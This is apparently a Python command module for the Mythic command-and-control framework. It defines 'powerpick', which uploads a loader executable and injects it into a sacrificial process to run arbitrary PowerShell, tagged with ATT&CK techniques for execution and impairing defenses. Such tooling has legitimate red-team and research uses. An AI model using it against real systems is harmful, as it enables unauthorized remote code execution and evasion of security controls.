from mythic_container.MythicCommandBase import *
import json
from .utils.bof_utilities import *
from .utils.mythicrpc_utilities import *

class PowerpickArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="powershell_params",
                cli_name="Command",
                display_name="Command",
                type=ParameterType.String,
                description="PowerShell command to execute.",
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require a PowerShell command to execute.\n\tUsage: {}".format(
                    PowerpickCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("powershell_params", parts[1])

class PowerpickCommand(CoffCommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = "powerpick -Command [command]"
    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
    version = 1
    script_only = True
    author = "@c0rnbread"
    argument_class = PowerpickArguments
    attackmapping = ["T1059", "T1562"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Set display parameters
        response.DisplayParams = "{}".format(taskData.args.get_arg("powershell_params"))

        # Upload desired module if it hasn't been before (per payload uuid)
        file_name = "powerpick.x64.exe"
        succeeded = await upload_module_if_missing(file_name=file_name, taskData=taskData)
        if not succeeded:
            response.Success = False
            response.Error = f"Failed to upload or check module \"{file_name}\"."


        # Execute PowerPick
        subtask = await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                taskData.Task.ID,
                CommandName="execute_assembly",
                SubtaskCallbackFunction="coff_completion_callback",
                Params=json.dumps({
                    "assembly_name": file_name,
                    "assembly_arguments": taskData.args.get_arg("powershell_params")
                }),
                Token=taskData.Task.TokenID,
            )
        )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp